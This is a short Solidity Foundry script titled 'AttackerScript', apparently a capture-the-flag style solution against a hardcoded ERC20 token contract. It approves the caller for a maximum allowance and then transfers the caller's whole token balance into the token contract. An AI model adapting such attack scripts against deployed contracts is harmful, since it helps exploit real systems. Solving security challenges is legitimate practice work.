// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

contract AttackerScript is Script {

    IERC20 target;

    function setUp() public {
        target = IERC20(0x383fB981816dE991089809D62533b6911dBBd928);
    }
    function run() public {
        vm.startBroadcast();

        console.log("my address: ", msg.sender);
        console.log("my balance: ", target.balanceOf(msg.sender));
        target.approve(msg.sender, type(uint256).max);
        target.transferFrom(msg.sender, address(target), target.balanceOf(msg.sender));

        vm.stopBroadcast();
    }
}
